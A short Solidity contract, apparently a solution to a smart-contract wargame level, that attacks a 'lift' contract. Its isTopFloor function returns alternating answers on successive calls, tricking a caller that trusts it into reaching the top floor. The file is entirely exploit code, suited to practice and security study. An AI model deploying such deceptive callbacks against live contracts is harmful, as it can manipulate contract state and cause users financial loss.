// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;


interface ILift {
    function goToFloor(uint _floor) external;
}


contract LiftAttack {
    bool public isTop = true;
    ILift lift;

    constructor(address _lift) {
        lift = ILift(_lift);
    }

    function isTopFloor(uint) public returns (bool) {
        isTop = !isTop;
        return isTop;
    }

    function callLift(uint _floor) public {
        lift.goToFloor(_floor);
    }
}